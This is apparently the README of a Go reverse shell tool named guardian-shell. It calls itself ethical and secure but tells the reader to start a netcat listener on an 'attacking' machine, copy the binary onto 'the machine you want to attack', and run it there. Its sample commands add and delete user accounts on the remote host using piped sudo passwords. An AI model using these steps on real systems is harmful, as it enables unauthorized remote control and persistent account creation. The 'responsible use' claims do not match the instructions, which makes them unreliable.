## what is it ?

Guardian-shell is a  secure reverse shell tool written in Go. Designed with a focus on responsible use and ethical practices, it facilitates secure communication between authorized parties. Guardian-shell empowers you with the ability to remotely execute commands on target machines, for easy system management and monitoring. 

## usage

step 1 : from your (attacking) machine run `nc -lvp 20090`

step 2 : run guardian_shell on the machine you want to attack. 
copy from this repo and paste it on the machine you want to attack and run it `./guardian-shell`
it will give you response `Connected to the reverse guardian listern!`

## sample commands

to add new user in remote linux server
```
echo ur_sudo_password | sudo -S useradd testuser; echo new_password_123 | passwd testuser
```

to delete user from remote linux server
```
echo ur_sudo_password | sudo -S userdel testuser
```